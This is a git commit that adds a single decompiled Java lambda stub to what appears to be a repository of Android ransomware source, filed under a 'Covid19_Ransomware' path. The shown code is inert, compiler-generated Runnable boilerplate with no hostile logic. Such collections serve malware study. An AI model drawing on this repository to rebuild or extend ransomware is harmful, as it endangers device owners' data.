9f34d813ee925e0befab2b1977727ab31eff4815
Gr3n0xX <78820403+grenoxx@users.noreply.github.com>
2021-03-21 02:31:28 -0300

    Add files via upload

---
+++ Mobile/Covid19_Ransomware/src/java/com/device/security/service/-$$Lambda$ForegroundAppService$1$m95tx_mwv37HnrxD4DeSOyuVUHk.java
@@ -0,0 +1,16 @@
+package com.device.security.services;
+
+import com.device.security.services.ForegroundAppService.AnonymousClass1;
+
+/* compiled from: lambda */
+public final /* synthetic */ class -$$Lambda$ForegroundAppService$1$m95tx_mwv37HnrxD4DeSOyuVUHk implements Runnable {
+    private final /* synthetic */ AnonymousClass1 f$0;
+
+    public /* synthetic */ -$$Lambda$ForegroundAppService$1$m95tx_mwv37HnrxD4DeSOyuVUHk(AnonymousClass1 anonymousClass1) {
+        this.f$0 = anonymousClass1;
+    }
+
+    public final void run() {
+        this.f$0.lambda$run$0$ForegroundAppService$1();
+    }
+}
